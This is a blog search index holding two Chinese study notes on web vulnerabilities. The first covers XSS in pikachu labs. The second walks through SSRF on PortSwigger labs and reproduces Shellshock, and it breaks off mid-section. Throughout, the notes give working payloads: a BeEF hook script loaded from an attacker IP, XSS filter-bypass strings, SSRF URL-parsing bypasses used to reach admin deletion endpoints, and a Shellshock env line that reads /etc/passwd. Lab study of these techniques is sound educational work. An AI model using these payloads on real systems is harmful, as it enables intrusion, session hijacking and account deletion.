<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-XSS/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-XSS/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞-XSS"><a href="#漏洞-XSS" class="headerlink" title="漏洞-XSS"></a>漏洞-XSS</h2><p>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型：<br>    1.反射性XSS;  &#x3D;&gt; 交互的数据一般不会被存在数据库中,恶意脚本请求中传入,服务器响应中返回,所见即所得,一次性<br>    2.存储型XSS;  &#x3D;&gt; 交互的数据存在数据库中,永久性存储,比如一些留言板,评论<br>    3.DOM型XSS; &#x3D;&gt; 不与后端服务器产生数据交互,是一种通过DOM操作前端数据输出的时候产生的问题</p><p>XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户<br>形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。<br>简单来讲就是在浏览器里面输入<code>&lt;script&gt;xxxx&lt;\script&gt;</code>脚本块,被当成js代码执行了</p><h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p><img src="/attachment/Pasted%20image%2020240224123110.png"><br>如图所示,输入的内容会显示在下面,如果在里面输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,那么就会执行alert(1)<br>假如此时输入框做了输入长度的限制,那么可以在url参数中写,绕过限制</p><h4 id="get类型"><a href="#get类型" class="headerlink" title="get类型"></a>get类型</h4><p>浏览器的输入通过get传递给后端,再由后端传回来显示在浏览器上.<br>这时攻击者C启动beef-xss,先模拟用户登录网站,在输入框输入hook代码<code>&lt;script src=&quot;http://&lt;C的ip&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>,再到beef的webUI界面<a href="http://127.0.0.1:3000/ui/panel%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E6%88%90%E5%8A%9F,%E5%A6%82%E6%9E%9C%E6%88%90%E5%8A%9F,%E9%82%A3%E4%B9%88%E5%B0%B1%E6%8A%8A%E6%AD%A4%E6%97%B6%E7%9A%84url(%E6%90%BA%E5%B8%A6%E6%9C%89%E7%94%A8%E6%88%B7%E4%BB%A3%E7%A0%81)%E5%8F%91%E9%80%81%E7%BB%99%E5%8F%97%E5%AE%B3%E8%80%85,%E5%8F%97%E5%AE%B3%E8%80%85%E7%82%B9%E5%87%BB%E8%BF%9E%E6%8E%A5,%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E5%B0%B1%E8%A2%AB%E5%8A%AB%E6%8C%81%E4%BA%86">http://127.0.0.1:3000/ui/panel检查是否成功,如果成功,那么就把此时的url(携带有用户代码)发送给受害者,受害者点击连接,浏览器的信息就被劫持了</a></p><h4 id="post类型"><a href="#post类型" class="headerlink" title="post类型"></a>post类型</h4><p>浏览器的输入通过post传递给后端,输入的内容不会被显示在url中,此时可以抓包,在参数那里写<code>&lt;script&gt;xxxx&lt;\script&gt;</code>代码</p><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><p>这个就是你存进去之后别人访问到这个页面也会有这个效果</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>DOM型XSS不同之处在于DOM型XSS一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生的。<br>例如</p><pre><code>&lt;html&gt;&lt;head&gt;&lt;title&gt;DOM Based XSS Demo&lt;/title&gt;&lt;script&gt;function xsstest()&#123;    var str = document.getElementById(&quot;input&quot;).value;    document.getElementById(&quot;output&quot;).innerHTML = &quot;&lt;img src=&#39;&quot;+str+&quot;&#39;&gt;&lt;/img&gt;&quot;;&#125;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id=&quot;output&quot;&gt;&lt;/div&gt;&lt;input type=&quot;text&quot; id=&quot;input&quot; size=50 value=&quot;&quot; /&gt;&lt;input type=&quot;button&quot; value=&quot;submit&quot; onclick=&quot;xsstest()&quot; /&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>输入 <code>x&#39; onerror=&#39;javascript:alert(/xss/)</code> 即可触发。</p><h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>xss盲打并不是xss漏洞的一种类型，而是xss漏洞的一个应用场景，主要是针对网站的后台管理员。<br>打开pukachu的xss盲打在输入框累随意输入一些字符点击提交，我们可以发现输入的结果并没有显示在前端，而是直接提交到后端管理员页面。<br> 如果我们输入一段js代码，由于是直接提交到后端管理员页面，用户前端并不会执行。<br> <img src="/attachment/Pasted%20image%2020240308091004.png"><br><img src="/attachment/Pasted%20image%2020240308091013.png"><br>我们在输入框输入<code>&lt;script&gt;alert(&#39;6666&#39;)&lt;/script&gt;</code>,然后提交，再点右上角的提示登入pikachuxss盲打的管理员后台；<br>我们会发现弹出了弹窗，说明我们盲打成功；xss盲打其实是一种尝试性的攻击行为，因为攻击者并不知道后台有没有输出或者是过滤；<br>xss盲打本质还是存储型xss漏洞的利用只不是后台输出端由用户变成了网站管理员，但是危害性就更大了。</p><h3 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h3><p>xss绕过-过滤-转换</p><p>例子：<br>1.前端限制绕过，直接抓包重放，或者修改html前端代码。比如反射型XSS(get)中限制输入20个字符。所以安全措施尽量不要放在前端。<br>2.大小写，比如<code>&lt;SCRIPT&gt;aLeRT(111)&lt;/sCRIpt&gt;</code>。如果过滤措施只对小写做了处理，我们就可以通过大写的输入来绕过他的措施，大写的输入被输出前端时仍然会被正常的执行。<br>3.双写（拼凑），<code>&lt;scri&lt;script&gt;pt&gt;alert(111)&lt;/scri&lt;/script&gt;pt&gt;</code>。会去除敏感标签如<code>&lt;script&gt;</code>但可能只会去除一次<br>4.注释干扰，<code>&lt;scri&lt;!--test--&gt;pt&gt;alert(111)&lt;/sc&lt;!--test--&gt;ript&gt;。在前端输出时注释是不会被执行的</code><br>xss绕过-过滤-编码</p><p>后台过滤了特殊字符，比如<code>&lt;script&gt;</code>标签，但该标签可以被各种编码，后台不一定会过滤，当浏览器对该标签进行识别时，会翻译成正常的标签，从而执行。（ps：使用编码要注意编码在输出点是否会被正常识别和翻译）</p><p>实验演示：</p><p>打开pikachu的xss之过滤，输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>点提交</p><p><a href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162302697-1539471751.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162302697-1539471751.png"></a></p><p>没有弹窗弹出</p><p><a href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162353375-6208091.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162353375-6208091.png"></a></p><p> 接着我们查看页面源码</p><p><a href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162613302-1868779407.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162613302-1868779407.png"></a></p><p> 可以看到我们输入的标签都被去掉了，说明后台有对<code>&lt;script&gt;</code>标签进行过滤</p><p>接下来我们使用大小写混合的方法输入<code>&lt;SCrIPT&gt;alert(1)&lt;/ScRiPt&gt;</code></p><p><a href="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162745829-1171243701.png"><img src="https://img2020.cnblogs.com/blog/2054866/202007/2054866-20200716162745829-1171243701.png"></a></p><p> 成功弹窗，说明我们成功绕过了过滤，他的过滤措施并没有对大小写过滤。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-SSRF/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-SSRF/</url>
    
    <content type="html"><![CDATA[<p>Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location.<br>就是伪造成服务端</p><h3 id="Basic-SSRF-against-the-local-server"><a href="#Basic-SSRF-against-the-local-server" class="headerlink" title="Basic SSRF against the local server"></a><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">Basic SSRF against the local server</a></h3><p><img src="/attachment/Pasted%20image%2020240514153559.png"><br>这里有一个check stock检查库存的功能<br>数据包是这样的<br><img src="/attachment/Pasted%20image%2020240514153633.png"><br>通过url解码可以看到<code>stockApi</code>是<img src="/attachment/Pasted%20image%2020240514153653.png"></p><p>为什么会有这个stockApi呢?</p><blockquote><p>例如，假设有一个购物应用程序，它允许用户查看某个商店中某件商品是否有货。为了提供库存信息，该应用程序必须查询各种后端 REST API。它通过前端 HTTP 请求将 URL 传递到相关的后端 API 端点来实现这一点。当用户查看某件商品的库存状态时，他们的浏览器会发出以下请求：</p></blockquote><pre><code>POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</code></pre><blockquote><p>这会导致服务端向特定的url发送一个请求取回库存的状态, 再返回给用户</p></blockquote><p>靶场的介绍中说这个网站有一个<a href="http://localhost/admin%E7%95%8C%E9%9D%A2">http://localhost/admin界面</a>, 但是你直接通过url访问是不能进去的, 因为你现在不在内网环境里面也没有登录管理员账号<br><img src="/attachment/Pasted%20image%2020240514153910.png"></p><p>这时候就可以利用刚才那个<code>stockApi</code><br>由于这个stockApi由服务端去访问的, 在内网环境里面, 请求来自本地, 那么我们就可以访问到页面了</p><p>所以在这里更改刚才的数据包再发送出去<br><img src="/attachment/Pasted%20image%2020240514154305.png"><br>就看到了admin页面, 这个页面的内容是服务端拉取再返回给用户的</p><p>靶场要求删除这名叫carlos的用户</p><p>那么我们找到删除用户的API<br><img src="/attachment/Pasted%20image%2020240514154502.png"><br>还是用<code>stockApi</code>发送这个url <code>http://localhost/admin/delete?username=carlos</code><br><img src="/attachment/Pasted%20image%2020240514155052.png"><br>返回了一个302重定向界面</p><p>然后再回到&#x2F;admin界面, 就完成了靶场<br><img src="/attachment/Pasted%20image%2020240514155134.png"></p><p>整个过程下来就是在利用stockApi这个参数来代替我们自己去访问网站</p><h3 id="Basic-SSRF-against-another-back-end-system"><a href="#Basic-SSRF-against-another-back-end-system" class="headerlink" title="Basic SSRF against another back-end system"></a><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system">Basic SSRF against another back-end system</a></h3><p>还是找到这个查看库存的数据包<br><img src="/attachment/Pasted%20image%2020240514155703.png"><br>url解码得到<br><img src="/attachment/Pasted%20image%2020240514155751.png"><br><code>stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&amp;storeId=1</code><br>题目要我们扫描内网<code>192.168.0.X:8080</code>的范围来找到admin的界面, 再利用admin删除carlos</p><p>将这个数据包发送到Intruder爆破模块<br><img src="/attachment/Pasted%20image%2020240514160117.png"><br>在1这个位置添加一个标记<br><img src="/attachment/Pasted%20image%2020240514160337.png"><br>然后转到payload这里这样设置<br><img src="/attachment/Pasted%20image%2020240514160455.png"><br>然后开始攻击, 等待它跑完</p><p>通过筛选返回的状态码, 可以看到</p><blockquote><p>192.168.0.177:8080返回的是404,<br>192.168.0.1:8080返回的是400,<br>而其他的都是500<br><img src="/attachment/Pasted%20image%2020240514160718.png"></p></blockquote><p>于是猜测这个地址是admin的地址, 发包<br><img src="/attachment/Pasted%20image%2020240514160913.png"><br>可以看到验证了猜想</p><p>然后是上一个的操作</p><h3 id="Blind-SSRF-with-out-of-band-detection"><a href="#Blind-SSRF-with-out-of-band-detection" class="headerlink" title="Blind SSRF with out-of-band detection"></a><a href="https://portswigger.net/web-security/ssrf/blind">Blind SSRF</a> with out-of-band detection</h3><p>使用DNS外带<br>打开靶场随便选择一个商品<br><img src="/attachment/Pasted%20image%2020240515002124.png"><br>发送到repeater<br><img src="/attachment/Pasted%20image%2020240515002318.png"><br>将这个Referer头插入payload, 然后发送, 这时候Referer就变成了我们burpsuite自己的DNS域名(记得在前面加上http:&#x2F;&#x2F;)<br><img src="/attachment/Pasted%20image%2020240515002559.png"><br>然后在burp的Collaborator模块里手动刷新(Poll now)<br><img src="/attachment/Pasted%20image%2020240515002657.png"><br>就看到了这些记录</p><h3 id="SSRF-with-blacklist-based-input-filter-bypass"><a href="#SSRF-with-blacklist-based-input-filter-bypass" class="headerlink" title="SSRF with blacklist-based input filter(bypass)"></a><a href="https://portswigger.net/web-security/ssrf">SSRF</a> with blacklist-based input filter(bypass)</h3><blockquote><p>Some applications block input containing hostnames like <code>127.0.0.1</code> and <code>localhost</code>, or sensitive URLs like <code>/admin</code>. In this situation, you can often circumvent(规避) the filter using the following techniques:</p></blockquote><ul><li>Use an alternative IP representation of <code>127.0.0.1</code>, such as <code>2130706433</code>, <code>017700000001</code>, or <code>127.1</code>.</li><li>Register your own domain name that resolves to <code>127.0.0.1</code>. You can use <code>spoofed.burpcollaborator.net</code> for this purpose.</li><li>Obfuscate(混淆) blocked strings using URL encoding or case variation.</li><li>Provide a URL that you control, which redirects to the target URL. Try using different redirect codes, as well as different protocols(协议) for the target URL. For example, switching from an <code>http:</code> to <code>https:</code> URL during the redirect has been shown to bypass some anti-SSRF filters.</li></ul><p>还是刚才那个检查库存的api<br><img src="/attachment/Pasted%20image%2020240518134312.png"><br>但是这时候直接发送localhost&#x2F;admin会发现被过滤了<br><img src="/attachment/Pasted%20image%2020240518134435.png"><br>换成127.0.0.1&#x2F;admin发现也是不行的<br><img src="/attachment/Pasted%20image%2020240518134500.png"><br>去掉admin, 也不行<br><img src="/attachment/Pasted%20image%2020240518134653.png"><br>将127.0.0.1换成127.1,  返回了常规网站界面<br><img src="/attachment/Pasted%20image%2020240518134713.png"><br>再加上&#x2F;admin  发现依然不行<br><img src="/attachment/Pasted%20image%2020240518134746.png"></p><p>说明<code>admin</code>也被ban了<br>将<code>admin</code>进行url编码, 发现还是失败<br><img src="/attachment/Pasted%20image%2020240518134932.png"></p><p>说明它可能在发送过去的时候后端就自动解码了, 这里我们可以将<code>admin</code>进行两次url编码<br><img src="/attachment/Pasted%20image%2020240518135501.png"><br><img src="/attachment/Pasted%20image%2020240518135438.png"><br>发送删除用户的api<br><img src="/attachment/Pasted%20image%2020240518135640.png"><br>发现成功删除用户</p><h3 id="SSRF-with-filter-bypass-via-open-redirection-vulnerability"><a href="#SSRF-with-filter-bypass-via-open-redirection-vulnerability" class="headerlink" title="SSRF with filter bypass via open redirection vulnerability"></a><a href="https://portswigger.net/web-security/ssrf">SSRF</a> with filter bypass via open redirection vulnerability</h3><p><img src="/attachment/Pasted%20image%2020240528175440.png"><br>靶场说这个192.168.0.12:8080是管理界面<br>但是这个stockApi被限制只能访问本地的应用</p><p>还是找到这个库存api<br><img src="/attachment/Pasted%20image%2020240528175418.png"><br>将地址替换为<code>http://192.168.0.12:8080/admin</code><br><img src="/attachment/Pasted%20image%2020240528175721.png"><br>提示说无效, 所以我们要找到一个可以用于重定向的地方</p><p>随便点击网站的一些别的按钮, 比如在这个<code>Next product</code><br><img src="/attachment/Pasted%20image%2020240530204159.png"></p><p><img src="/attachment/Pasted%20image%2020240528175905.png"><br>这里浏览器使用GET请求向<code>/product/nextProduct</code>界面发送了一个<code>currentProductId=1</code>参数和一个<code>path=/product?productId=2</code>参数<br>服务器返回了302重定向, 其中<code>Location</code>头代表了重定向的位置<br>可以看到, path参数指定了Location头的值, 也就是接下来要访问的地址</p><blockquote><p>服务端响应<code>3**</code>状态码时，服务端会告诉浏览器要跳转到哪个网址，此时就需要用到响应Header的Location属性<br>当浏览器响应的状态码为<code>3**</code>时，我们就需要用到<code>Location</code>这个属性，这个属性会告诉浏览器接下来要访问哪条资源路径</p></blockquote><p>这就是一种叫<code>open redirection</code>漏洞, 我们可以通过控制类似<code>path</code>这样的参数控制浏览器下一步重定向到哪里<br>因此我们可以利用这个漏洞让服务器成功访问到admin界面并返回给我们</p><p>这其中的过程大致如下(为了方便区分我使用服务端的某某地址来称呼, 其实都是一台机器):</p><ul><li>如果利用刚才那个地方的<code>stockApi</code>向服务端的这个地址<code>/product/stock</code>发送这一串字符串<code>/product/nextProduct?currentProductId=1&amp;path=/product?productId=2</code></li><li>那么服务端的就会访问<code>/product/nextProduct</code>这个地址(就是本地)并且发送两个这样的参数<code>currentProductId=1&amp;path=/product?productId=2</code></li><li><code>/product/nextProduct</code>这里个地方接收到之后, 就会让对方, 也就是服务器自己, 重定向到<code>/product?productId=2</code>这个地址<br><img src="/attachment/Pasted%20image%2020240530211923.png"><br><strong>注意, 实际上使用<code>stockApi</code>的时候记得把参数都进行一次url编码</strong><br>可以看到, 返回了下一件商品的页面</li><li>现在我们只需要把<code>path</code>参数替换为<code>http://192.168.0.12:8080/admin</code>就可以访问到管理界面</li></ul><h2 id="SSRF-with-whitelist-based-input-filters"><a href="#SSRF-with-whitelist-based-input-filters" class="headerlink" title="SSRF with whitelist-based input filters"></a>SSRF with whitelist-based input filters</h2><blockquote><p>有些应用程序只允许匹配的输入，即允许值的白名单。筛选器可能会在输入的开头或其中包含的内容中查找匹配项。可以利用URL解析中的不一致性绕过此筛选器。<br>&#x3D;&#x3D;Some applications only allow inputs that match, a whitelist of permitted values. The filter may look for a match at the beginning of the input, or contained within in it. You may be able to bypass this filter by exploiting inconsistencies in URL parsing.&#x3D;&#x3D;</p></blockquote><blockquote><p>URL规范包含许多特性，当URL使用此方法实现特别解析和验证时，这些特性可能会被忽略:<br>&#x3D;&#x3D;The URL specification contains a number of features that are likely to be overlooked when URLs implement ad-hoc parsing and validation using this method: &#x3D;&#x3D;</p></blockquote><ul><li><p>你可以在主机名前面使用<code>@</code>嵌入证书&#x3D;&#x3D;You can embed credentials in a URL before the hostname, using the <code>@</code> character&#x3D;&#x3D;.<br>  For example:<code>https://expected-host:fakepassword@evil-host</code><br>  没找到资料, 我估计前面的是一种类似于登录的</p></li><li><p>使用<code>#</code>来指示URL的分段&#x3D;&#x3D;You can use the <code>#</code> character to indicate a URL fragment. For example:&#x3D;&#x3D;<br>  <code>https://evil-host#expected-host</code><br>  <a href="obsidian://open?vault=xiaod.web&file=%E5%85%B3%E4%BA%8Eurl%E4%B8%AD%EF%BC%83%E7%9A%84%E4%BD%9C%E7%94%A8">关于url中<code>#</code>的作用</a>  </p></li><li><p>可以利用 DNS 命名层次结构来放置你控制的充分认证后的DNS名。&#x3D;&#x3D;You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:&#x3D;&#x3D;<br>  <code>https://expected-host.evil-host</code></p></li><li><p>您可以对字符进行 URL 编码，以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式与执行后端 HTTP 请求的代码不同，则此功能特别有用。您还可以尝试对字符进行双重编码；某些服务器会递归对输入进行 URL 解码, 从而导致进一步的差异&#x3D;&#x3D;You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request. You can also try <a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding">double-encoding</a> characters; some servers recursively URL-decode the input they receive, which can lead to further discrepancies.&#x3D;&#x3D;</p></li><li><p>You can use combinations of these techniques together.</p></li></ul><p>还是这个靶场, 管理页面是这个<code>http://localhost/admin</code><br>检查库存<br><img src="/attachment/Pasted%20image%2020240629182021.png"><br><img src="/attachment/Pasted%20image%2020240630022411.png"></p><p><code>stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&amp;storeId=1</code><br>这个靶场是有白名单的, 所以类似于<code>http://localhost/admin</code>这种是不允许访问的<br>检查器必须要检查是<code>stock.weliketoshop.net</code>这个域名才会放行<br>用@这种方式, 假装是以用户名进行访问<br><code>stockApi=http://username@stock.weliketoshop.net</code></p><p>但是这还不能访问到我们想要访问的admin<br>所以我们改为<code>http://localhost#@stock.weliketoshop.net</code><br>然后再对<code>#</code>进行两次url编码即<code>%2523</code><br>得到<br><code>http://localhost%2523@stock.weliketoshop.net</code><br>然后发送, 就会发现可以被接收<br><img src="/attachment/Pasted%20image%2020240630025501.png"><br>为什么这个可以被接收呢?<br>首先我们输入的是<code>http://localhost%2523@stock.weliketoshop.net</code><br>进行一次解码之后, 那个检查域名的程序看到的就是<code>http://localhost%23@stock.weliketoshop.net</code>它会以为@前面的是用户名, 它看到右边的确实是正确的域名之后就放行了<br>最后被目标服务器接收到的时候又经过了一次url解码, 目标服务器看到的是<code>http://localhost#@stock.weliketoshop.net</code>, 它认为#后面的是对于http消息传递中没用的信息(具体看<code>#</code>的作用)于是最后访问的是localhost</p><p>如果要访问admin的话, payload就需要是<br><code>http://localhost%2523@stock.weliketoshop.net/admin</code><br>成功访问<br><img src="/attachment/Pasted%20image%2020240630030110.png"><br>删除用户<br><img src="/attachment/Pasted%20image%2020240630030150.png"></p><h2 id="Blind-SSRF-with-Shellshock-exploitation"><a href="#Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="Blind SSRF with Shellshock exploitation"></a><a href="https://portswigger.net/web-security/ssrf/blind">Blind SSRF</a> with Shellshock exploitation</h2><p>这是涉及到一个Linux破壳漏洞<br><a href="https://www.cnblogs.com/Cl0ud/p/14248937.html"># Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析</a><br><a href="https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/">https://zgao.top/bash%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9Ecve-2014-6271%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</a></p><p>GNU Bash 4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。</p><p>这个漏洞的英文是：<strong>ShellShock</strong>，中文名被XCERT命名为：破壳漏洞。</p><p>该漏洞在Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10中均拥有存在CVE-2014-6271（即“破壳”漏洞）漏洞的Bash版本，同时由于Bash在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用Bash的Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。</p><p>漏洞的利用方式会通过与Bash交互的多种应用展开，包括HTTP、OpenSSH、DHCP等</p><h3 id="本地漏洞检测"><a href="#本地漏洞检测" class="headerlink" title="本地漏洞检测"></a>本地漏洞检测</h3><p>搭建一个vulhub靶场, <code>docker-compose up -d</code></p><p>具体搭建过程<a href="https://www.cnblogs.com/Cl0ud/p/14248937.html"># Bash 破壳漏洞Shellshock （CVE-2014-6271）复现分析</a></p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105111432.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105111432.png"></a></p><p>进入<code>docker</code>容器</p><p><code>payload</code>为： <code>env x=&#39;() &#123; :;&#125;; echo shellshocked&#39; bash –c &quot;echo hi&quot;</code></p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105112350.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105112350.png"></a></p><p>命令解释如下(&#x3D;&#x3D;这部分看不懂没关系, 看完下面的漏洞原理再回来&#x3D;&#x3D;)：</p><p><code>env x=&#39;() &#123; :;&#125;; echo shellshocked&#39; bash -c &quot;echo hi&quot;</code></p><ul><li><code>env</code>: 这个命令用来设置环境变量。</li><li><code>x=&#39;() &#123; :;&#125;; echo shellshocked&#39;</code>: 这里设置了一个名为<code>x</code>的环境变量，其值为一个函数定义，该函数什么也不做（<code>:</code>是空操作，<code>;</code>是分隔符），然后输出<code>shellshocked</code>。</li><li><code>bash -c &quot;echo hi&quot;</code>: 这是启动一个新的bash会话，并执行<code>-c</code>选项后面的命令，即<code>echo hi</code>。</li></ul><p>漏洞利用的关键点在于，当<code>bash -c</code>启动一个新的bash会话时，它会从环境变量中读取函数定义。由于<code>x</code>变量被设置为一个函数定义，bash会话会读取这个定义并执行它。这就是为什么你会看到<code>shellshocked</code>被输出的原因。</p><p>这个命令执行后，首先输出<code>shellshocked</code>，然后是<code>echo hi</code>命令的结果，即<code>hi</code>。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>口语化阐释一下漏洞原理：<code>父进程中的特殊变量字符串(这里指字符串内容为函数)成为环境变量后，在子进程中调用该字符串时将其理解为函数执行</code></p><p>在<code>shell</code>中函数定义：<a href="https://www.runoob.com/linux/linux-shell-func.html">https://www.runoob.com/linux/linux-shell-func.html</a></p><pre><code class="bash">#!/bin/bash# author:菜鸟教程# url:www.runoob.comdemoFun()&#123;    echo &quot;这是我的第一个 shell 函数!&quot;&#125;echo &quot;-----函数开始执行-----&quot;demoFunecho &quot;-----函数执行完毕-----&quot;</code></pre><p>在<code>shell</code>中定义变量<br><code>springbird=&quot;hi&quot;</code></p><p>使用<code>echo</code>输出</p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115013.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115013.png"></a></p><p>然后开启以后新的进程后，可以看到<code>$springbird</code>变量没有继承到子进程中来<br>那么我们怎么样才能在子进程中使用父进程的变量呢？(自问自答)<br>可以将变量存储到环境变量中，这样就可以在父子进程中一起使用该变量了<br>我们使用<code>export</code>命令将其设置为环境变量，<code>export</code>简介：<a href="https://www.runoob.com/linux/linux-comm-export.html">https://www.runoob.com/linux/linux-comm-export.html</a></p><p>如图：</p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115444.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115444.png"></a></p><p>可以看到设置环境变量后子进程也能够使用该变量了</p><p>这个时候我们设置一个函数作为环境变量</p><p><code>x()&#123; echo &quot;test&quot;; &#125;</code></p><p>如图</p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115653.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105115653.png"></a></p><p>可以看到子进程中也能成功执行该函数</p><p>这时候我们改变一点点<br>创建字符串环境变量<code>springbird</code><br><code>export springbird=&#39;() &#123; cat /etc/passwd;&#125;&#39;</code></p><p><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105123724.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105123724.png"></a></p><p><strong>注意</strong>：</p><p><code>()</code>和<code>&#123;</code>之间有空格</p><p>可以看到我们创建的字符串变量被设置成环境变量后在子进程解释成了函数执行，成功读取了 <code>/etc/passwd</code></p><h3 id="阶段总结"><a href="#阶段总结" class="headerlink" title="阶段总结"></a>阶段总结</h3><p>把上面的操作合起来就是<code>env x=&#39;() &#123; echo accsessme;&#125;; echo vulnerable&#39; bash -c &#39;x&#39;</code><br><a href="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105124137.png"><img src="https://springbird.oss-cn-beijing.aliyuncs.com/blog20210105124137.png"></a></p><p>这里发生了以下步骤：</p><ol><li><code>env</code> 命令设置了一个名为 <code>x</code> 的环境变量，其值是一个函数定义，该函数输出 <code>accsessme</code>，然后是 <code>;</code> 分号和 <code>echo vulnerable</code>。</li><li><code>bash -c &#39;x&#39;</code> 命令启动一个新的 Bash 会话，并告诉它执行字符串 <code>&#39;x&#39;</code>。由于这是在命令行中，Bash 会首先解析 <code>x</code> 环境变量的值。</li><li>由于Shellshock漏洞，Bash 在解析环境变量时会错误地执行环境变量值中的函数定义。因此，<code>x</code> 环境变量被当作函数定义来执行，输出 <code>accsessme</code>。</li><li>然而，由于命令行解析的方式，<code>bash -c &#39;x&#39;</code> 这部分实际上首先执行了 <code>echo vulnerable</code> 命令。这是因为在命令行解析过程中，<code>-c &#39;x&#39;</code> 指定的字符串 <code>&#39;x&#39;</code> 被当作命令执行，而环境变量 <code>x</code> 的值被当作该命令的参数。</li><li>因此，<code>echo vulnerable</code> 首先执行，输出 <code>vulnerable</code>。</li><li>然后，由于环境变量 <code>x</code> 被设置为包含函数定义，Bash 尝试执行这个函数定义，输出 <code>accsessme</code>。</li></ol><p>所以，输出的顺序是 <code>vulnerable</code> 首先被输出，然后是 <code>accsessme</code>，这是因为命令行解析和执行的方式，以及Shellshock漏洞允许环境变量中的函数定义被执行。</p><p>触发并利用破壳漏洞的所需要的几点：</p><ul><li>被攻击的bash存在漏洞（版本小于等于4.3）</li><li>攻击者可以控制环境变量</li><li>新的bash进程被打开触发漏洞并执行命令</li></ul><p>从上面的分析中可以看出，漏洞的根本原因存在于Bash的ENV命令实现上，因此漏洞本身是不能够直接导致远程代码执行的。如果要达到远程代码执行的目的，必须借助第三方服务程序作为媒介才能够实现，第三方服务程序也必须要满足众多条件才可以充当此媒介的角色。</p><p>该<code>Bash</code>使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令<code>ENV</code>中解析成函数后，<code>Bash</code>执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p><h3 id="web漏洞检测"><a href="#web漏洞检测" class="headerlink" 